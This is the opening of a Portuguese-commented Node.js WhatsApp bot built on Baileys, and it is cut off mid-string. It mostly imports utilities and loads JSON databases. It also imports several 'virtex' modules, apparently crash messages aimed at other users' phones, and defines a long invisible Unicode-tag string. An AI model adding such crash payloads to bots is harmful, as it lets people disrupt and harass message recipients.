//====================[ CONECTAR O WHATSAPP]====================//
const
	{
	    WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		WA_MESSAGE_STUB_TYPES,
		WA_DEAFULT_EPHEMERAL,
		waChatKey,
		mentionedJid,
		processTime,
		prepareMessageFromContent, 
		relayWAMessage
	} = require("@adiwajshing/baileys")
//====================[ FIM DE CONECTAR O WHATSAPP]====================//
	
//====================[ MÓDULOS ]====================//
const yo = require("tod-api");
const dh = require("dhn-api");
const ra = require("ra-api");
const simple = require('./funções/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const chalk = require('chalk');
const request = require('request')
const util = require('util')
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ytsd = require('ytsr')
const yts = require( 'yt-search')
const cheerio = require('cheerio')
const fromData = require('form-data')
const os = require('os')
const translate = require('./funções/google-tradutor')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const toMs = require('ms')
const fetch = require('node-fetch')
const imgbb = require('imgbb-uploader')
const { EmojiAPI } = require('./funções/emoji-api')
const emoji = new EmojiAPI()
const speed = require('performance-now')
const { color, bgcolor } = require('./funções/color')
const { exec } = require('child_process')
const { fetchJson } = require('./funções/fetcher')
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./funções/uploadimage')
const { uploadimg, upload } = require('./funções/uploadimg')
const { webp2mp4File } = require('./funções/webp2mp4')
const { wikiSearch } = require('./funções/wiki.js')
const { herolist } = require('./funções/herolist.js')
const { webp2gifFile } = require("./funções/gif.js")
const { herodetails } = require('./funções/herodetail.js')
const { mediafireDl } = require('./funções/mediafire.js')
const afk = require("./funções/afk");
const { lerimg } = require('./funções/ocr')
const hx = require("hxz-api");
const { addLimit, getLimit } = require('./funções/limit.js')// LIMITADOR DO TTT
const { pinterest } = require('./funções/pinterest')
const level = require("./funções/level");
const premium = require("./funções/premium");
const { addTTTId, addTTTwin, addTTTdefeat, addTTTtie, addTTTpoints, getTTTId, getTTTwins, getTTTdefeats, getTTTties, getTTTpoints } = require('./funções/tictactoe.js')
const { addCommands, checkCommands, deleteCommands } = require('./funções/autoresp')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./funções/ytdl')
const { igdl, formatDate } = require("./arquivos/ytdl");
const { getBuffer, getGroupAdmins, getRandom, start, info, success, close } = require('./funções/functions')
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const client = new WAConnection()
const {
  ytDonlodMp3,
  ytDonlodMp4,
  ytPlayMp3,
  ytPlayMp4,
  ytSearch
} = require('./funções/yt');
//====================[ FIM DOS MÓDULOS ]====================//

//====================[ FIGURINHA WM ]====================//
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./funções/exif')
const exif = new Exif()
//====================[ FIM DE FIGURINHA WM ]====================//

//====================[ DATA BASE ]====================//
const setik = JSON.parse(fs.readFileSync('./db/arquivos_db/setik.json'))
const vien = JSON.parse(fs.readFileSync('./db/arquivos_db/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./db/arquivos_db/imagi.json'))
const commandsDB = JSON.parse(fs.readFileSync('./db/outros_db/commands.json'))
const msgLimit = JSON.parse(fs.readFileSync('./db/outros_db/msgLimit.json'))
const tictactoe = JSON.parse(fs.readFileSync("./db/grupo_db/tictactoe.json"))
const tictactoe2 = JSON.parse(fs.readFileSync('./db/ttt/tictactoe.json')); //DADOS JOGO DA VELHA
const daily = JSON.parse(fs.readFileSync('./db/ttt/diario.json'))
const { ttthelp } = require('./db/ttt/TTTconfig/ttthelp');
const { tttme } = require('./db/ttt/TTTconfig/tttme');
var tttset = require('./db/ttt/TTTconfig/tttset.json');
var esp = require('./db/ttt/TTTconfig/tttframe.json');
const antilink = JSON.parse(fs.readFileSync('./db/anti_db/antilink.json'))
const nsfw = JSON.parse(fs.readFileSync('./db/grupo_db/nsfw.json'));
const autofigurinha = JSON.parse(fs.readFileSync('./db/grupo_db/autofigurinha.json'))
const antidoc = JSON.parse(fs.readFileSync('./db/anti_db/antidoc.json'))
const anticon = JSON.parse(fs.readFileSync('./db/anti_db/anticon.json'))
const antiloc = JSON.parse(fs.readFileSync('./db/anti_db/antiloc.json'))
const anticat = JSON.parse(fs.readFileSync('./db/anti_db/anticat.json'))
const antifake = JSON.parse(fs.readFileSync('./db/anti_db/antifake.json'))
const welkom = JSON.parse(fs.readFileSync('./db/grupo_db/welkom.json'))
const mute = JSON.parse(fs.readFileSync('./db/grupo_db/mute.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const scommand = JSON.parse(fs.readFileSync('./db/outros_db/scommand.json'))
const antiviewonce = JSON.parse(fs.readFileSync('./db/anti_db/antiviewonce.json'));
const dinheiro = JSON.parse(fs.readFileSync('./db/usuário_db/dinheiro.json'))
const _limit = JSON.parse(fs.readFileSync('./db/usuário_db/limit.json'))
const _premium = JSON.parse(fs.readFileSync('./db/usuário_db/premium.json'));
const _afk = JSON.parse(fs.readFileSync('./db/usuário_db/afk.json'));
const ban = JSON.parse(fs.readFileSync('./db/usuário_db/banned.json'));
const _leveling = JSON.parse(fs.readFileSync('./db/grupo_db/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./db/usuário_db/level.json'))
const { TelegraPh } = require('./funções/uploader')
//====================[ FIM DA DATA BASE ]====================//

//====================[ CACHÊS ]====================//
const _cmds = JSON.parse(fs.readFileSync('./db/cachê/cachê/comandos_usados.json'));
const _usuario = JSON.parse(fs.readFileSync('./db/cachê/cachê/usuário.json'));
//====================[ FIM DOS CACHÊS ]====================//

//====================[ CONFIGURAÇÃO ]====================//
limitawal = 30
ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
cmhit = []
autorespon = false
antidelete = false
baterai = {
battery: "" || "Não detectado",
isCharge: "" || false
}
offline = false
publik = true
bugc = false
lermais = '󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈??󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔󠁒󠁖󠁛󠁕󠁒󠁝󠁜󠁒󠁛󠁓󠁖󠁟󠁐󠁚󠁓󠁙󠁋󠁎󠁒󠁂󠁂󠁉󠁛󠁕󠁍󠁋󠁔󠁎󠁄󠁃󠁃󠁐󠁐󠁈󠁉󠁋󠁎󠁎󠁅󠁄󠁃󠁃󠁓󠁞󠁖󠁍󠁌󠁌󠁕󠁍󠁆󠁊󠁃󠁃󠁕󠁊󠁂󠁌󠁉󠁖󠁕󠁂󠁖󠁋󠁅󠀺󠁝󠁒󠁋󠁂󠁂󠁕󠁆󠁎󠁞󠁕󠁍󠁖󠁖󠁈󠁎󠁌󠁋󠁕󠁊󠁋󠁌󠁍󠁍󠁄󠁌󠁌󠁋󠁋󠁋󠁋󠁊󠁂󠀺󠁄󠁅󠁎󠁆󠁅󠁎󠁎󠁍󠁕󠁕󠁔󠁔󠁔󠁔󠁔󠁃󠁃󠁛󠁣󠁜󠁋󠁓󠁔󠁌󠁔󠁌󠁔󠁋󠁂󠁑󠁔󠁄󠀻󠁃󠁄󠁌󠁅󠁄󠁎󠁄󠁄󠁄󠁎󠁖󠁖󠁞󠁞󠁖󠁖󠁖󠁕󠁝󠁓󠁔󠁌󠁋󠁊󠁓󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁓󠁓󠁃󠁋󠁋󠁃󠁃󠁃󠁃󠁃󠁋󠁌󠁋󠁌󠁌󠁌󠁌󠁌󠁌󠁓󠁓󠁋󠁋󠁋󠁋󠁓󠁋󠁒󠁚󠁚󠁙󠁉󠁉󠁉󠁉󠁉󠁉󠁉󠁁󠁁󠁁󠁉󠁉󠁑󠁑󠁓󠁔󠁔󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁓󠁛󠁔󠁌󠁍󠁍󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁅󠁄󠁄󠁄󠁄󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁃󠁔󠁕󠁍󠁌󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁋󠁄󠁄󠁌󠁌󠁌󠁍󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁕󠁌󠁃󠁃󠁋󠁂󠁈󠁊󠁌󠁅󠁎󠁅󠀼󠁄󠀼󠁄󠀼󠁄󠁄󠁄󠁄󠀻󠁃󠁃󠁃󠁋󠁋󠁔󠁔󠁔󠁕󠁍󠁅󠁅󠁄󠁃󠁋󠁌󠁌󠁄󠁄󠁄󠁄󠁍󠁍󠁍󠁍󠁍󠁕󠁌󠁋󠁂󠁊󠁊󠁊󠁒󠁒󠁔󠁔󠁕󠁕󠁕󠁍󠁍󠁍󠁍󠁍󠁌󠁌󠁍󠁍󠁕󠁍󠁍󠁍󠁅󠁌󠁋󠁓󠁚󠁑󠁐󠁒󠁓󠁔󠁌󠁍󠁄󠁄󠁃󠁃󠁃󠁃󠀻󠁋󠁋󠁕󠁖󠁎󠁅󠁑󠁊󠁋󠁉󠁋󠁂󠁈󠁊󠁂󠁋󠁃󠁊󠁖󠁂󠁆󠁖󠁕󠁋󠁖󠁓󠁆󠁊󠁓󠁎󠁖󠁍󠁕󠁂󠁎󠁕󠁊󠁑󠁓󠁎󠁎󠁕󠁕󠁉󠁈󠁑󠁒󠁊󠁑󠁕󠁐󠁖󠁍󠁙󠁕󠁈󠁝󠁂󠁒󠁕󠁊󠁊󠁋󠀣󠀢󠀢󠀢󠀥󠁃󠁂󠁂󠁁󠁌󠁄󠁌󠁎󠁅󠁍󠁌󠁑󠁑󠁉󠁓󠁕󠁋󠁕󠁍󠁃󠁋󠁋󠁋󠁎󠁕󠁋󠁆󠁆󠁜󠁆󠁋󠁎󠁒󠁓󠁒󠁂󠁓󠁖󠁓󠁋󠁊󠁒󠁓󠁋󠁓󠁋󠄄󠁋󠄍󠄄󠄅󠄍󠁍󠁓󠁃󠁕󠁛󠁜󠁔